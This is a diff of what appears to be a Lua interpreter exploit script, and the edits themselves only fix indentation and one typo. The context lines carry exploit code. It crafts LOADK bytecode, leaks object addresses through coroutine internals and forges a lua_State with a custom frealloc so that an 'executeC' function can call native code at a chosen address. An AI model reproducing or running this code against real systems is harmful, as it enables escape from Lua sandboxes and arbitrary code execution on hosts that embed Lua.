@@ -32,14 +32,14 @@ local function escapeString(s)
 end
 
 local function numTo32L(n)
-        local a1 = n%256
-        local q = (n - a1)/256
-        local a2 = q % 256
-        q = (q - a2)/256
-        local a3 = q % 256
-        q = (q - a3)/256
-        local a4 = q
-        return string.char(a1, a2, a3, a4)
+	local a1 = n%256
+	local q = (n - a1)/256
+	local a2 = q % 256
+	q = (q - a2)/256
+	local a3 = q % 256
+	q = (q - a3)/256
+	local a4 = q
+	return string.char(a1, a2, a3, a4)
 end
 
 local function numTo64L(n)
@@ -50,14 +50,14 @@ local function numTo64L(n)
 	local a3 = q % 256
 	q = (q - a3)/256
 	local a4 = q % 256
-    q = (q - a4)/256
-    local a5 = q % 256
-    q = (q - a5)/256
-    local a6 = q % 256
-    q = (q - a6)/256
-    local a7 = q % 256
-    q = (q - a7)/256
-    local a8 = q
+	q = (q - a4)/256
+	local a5 = q % 256
+	q = (q - a5)/256
+	local a6 = q % 256
+	q = (q - a6)/256
+	local a7 = q % 256
+	q = (q - a7)/256
+	local a8 = q
 	return string.char(a1, a2, a3, a4, a5, a6, a7, a8)
 end
 
@@ -67,7 +67,7 @@ local function createLOADK(ra, k, t)
 	local i = 0x01 + (ra*2^6) + Bx
 --	print (string.format("%08X, Bx=0x%X", i, Bx/(2^14)))
 	i = numTo32L(i)
-    return i
+	return i
 end
 
 
@@ -138,7 +138,7 @@ local function objAddr(o)
 	local tp = type(o)
 	if (known_objects[tp]) then return _objAddr(o) end
 
-	local f = function(a) coroutine.yield(a)  end
+	local f = function(a) coroutine.yield(a) end
 	local t = coroutine.create(f)
 	local top = readAddr(_objAddr(t) + 0x8) --The field top is in offset 0x08 in 32b
 	--print (t, string.format("top: 0x%08X", top))
@@ -154,7 +154,7 @@ local function bufferAddress(b)
 end
 
 --[[
-The function will run a new thread (lua_State) with a custome frealloc.
+The function will run a new thread (lua_State) with a custom frealloc.
 The custom frealloc will be called with the following arguments:
 arg a: controlled by the user (i.e. you!)
 arg b: NULL
@@ -175,7 +175,7 @@ local function executeC(addr, arg_a)
 --	print (string.format('l_G_addr: 0x%08x', l_G_addr))
 	local t_buffer = memcpy(t_addr, lua_State_size) -- sizeof(lua_State)=208
 	
-	t_buffer = t_buffer:sub(1,5)  .. '\01' .. t_buffer:sub(7,12) .. numTo32L(l_G_addr) .. t_buffer:sub(17)
+	t_buffer = t_buffer:sub(1,5) .. '\01' .. t_buffer:sub(7,12) .. numTo32L(l_G_addr) .. t_buffer:sub(17)
 
 	collectgarbage()
 	t_addr = bufferAddress(t_buffer)
@@ -198,10 +198,10 @@ local function executeC(addr, arg_a)
 	local intermid = {}
 	collectgarbage()
 	intermid = nil
-   	k=nil
+	k=nil
 	collectgarbage()
 	g, err = load(g)
---    print (string.format('l_G: 0x%08X, #l_G: %d, #t_buffer: %d', l_G_addr, #l_G, #t_buffer))
+--	print (string.format('l_G: 0x%08X, #l_G: %d, #t_buffer: %d', l_G_addr, #l_G, #t_buffer))
 	g()	
 end
 
